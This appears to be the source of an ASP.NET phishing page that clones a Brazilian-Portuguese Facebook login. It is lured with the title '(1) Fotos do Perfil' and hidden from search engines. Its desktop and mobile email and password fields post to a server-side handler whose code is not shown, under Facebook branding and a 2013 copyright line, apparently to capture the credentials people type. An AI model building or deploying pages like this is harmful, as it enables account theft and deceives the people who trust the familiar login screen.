<%@ page language="C#" autoeventwireup="true" inherits="_Default, App_Web_qu4m5pgi" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head runat="server">
        <title>(1) Fotos do Perfil</title>
        <link rel="stylesheet" href="structure.css" />
        <link rel="stylesheet" href="mobile.css" media="screen and (max-device-width:320px) and (max-device-width:480px)" />
        <link rel="shortcut icon" href="images/icone.ico" />
        <meta name="robots" content="no-index" />
        <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no" /> 
    </head>
    <body>
        <form id="form1" runat="server">
            <div id="wrapper">
                <div id="header">
                    <h1>
                        <a href="https://www.facebook.com.br/">
                            Logotipo
                        </a>
                    </h1>

                    <div class="login">
                        <ul>
                            <li>
                                <label for="email">E-mail ou telefone</label>
                                <asp:TextBox ID="txtEmail" runat="server" TabIndex="1" />
                            </li>
                            <li>
                                <label for="password">Senha</label>
                                <asp:TextBox ID="txtPassword" runat="server" TextMode="Password" TabIndex="2" />
                            </li>
                            
                            <li>                           
                                <asp:Button ID="btnEntrar" runat="server" Text="Entrar" TabIndex="4" 
                                    onclick="btnEntrar_Click" />
                            </li>
                        </ul>

                        <ul>
                            <li>
                                <input id="persist" type="checkbox" checked="1" value="1" name="persist" />
                                <label for="persist" class="persist">Mantenha-me conectado</label>
                            </li>
                            <li>
                                <a href="#">Esqueceu sua senha?</a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div id="content">
                    <div class="sideLeft">
                
                    </div>
                    <div class="sideRight">
                
                    </div>
                </div>
                <div id="footer">
            
                </div>
            </div>

            <div id="wrapperMobile">
            <div id="Header">
                <div class="Logo">
                    <a href="/" title=""><i><u>Logotipo</u> </i></a>
                </div>  
            </div>
            <div id="Sub-Content">
                <div id="Content">
                    <div class="Cadastre">
                        Já tem uma conta
                    </div>

                    <div class="Login">
                        <ul>
                            <li class="txtEmail">
                                <asp:TextBox ID="txtEmailMobile" runat="server" TabIndex="1" placeholder="E-mail ou telefone" />
                            </li>
                            <li class="txtPassword">
                                <asp:TextBox ID="txtPasswordMobile" runat="server" placeholder="Senha" TextMode="Password" TabIndex="2" />
                            </li>                            
                            <li class="btnEnviar">                           
                                <asp:Button ID="btnEntrarMobile" runat="server" onclick="btnEntrar_Click" Text="Entrar" TabIndex="3" />
                            </li>
                            <li class="btnCriar">                           
                                <asp:Button ID="btnCriar" runat="server" Text="Criar nova conta" TabIndex="4" />
                            </li>
                            <li class="Esqueceu">                           
                                Esqueceu a senha? · Central de ajuda
                            </li>
                        </ul>
                    
                    </div>
                </div>
            </div>

            <div id="Footer">
                <div class="Language">
                    <span>
                        <b>Português (Brasil)</b>
                        <span> · </span>
                        <a href="">English (US)</a>
                        <span> · </span>
                        <a href="">Español</a>
                        <span> · </span><a href="">Mais…</a>
                    </span>
                </div>
                <div class="Right">
                    <span>
                        Facebook © 2013
                        <span> · </span>
                        <a href="">Comentários</a>
                    </span>
                </div>
            </div>
        </div>
        </form>
    </body>
</html>
